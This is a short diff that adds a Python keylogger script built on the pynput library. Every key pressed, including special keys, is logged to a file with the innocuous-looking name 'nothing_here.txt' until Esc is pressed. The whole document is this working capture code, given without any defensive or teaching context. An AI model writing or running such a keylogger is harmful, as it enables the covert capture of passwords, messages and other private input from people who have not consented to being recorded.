@@ -1,0 +1,21 @@
+# Python keylogger
+
+import pynput
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    try:
+        with open('nothing_here.txt', 'a') as file:
+            file.write(f'Key pressed: {key.char}\n') # key.char is used to get the character representation of the pressed key.
+    except AttributeError:
+        with open('nothing_here.txt', 'a') as file:
+            file.write(f'Special key pressed: {key}\n')
+
+def on_release(key): # to stop the keylogger
+    if key == Key.esc:
+        return False
+
+listener = Listener(on_press=on_press, on_release=on_release)
+
+listener.start() # to start the keylogger
+listener.join()
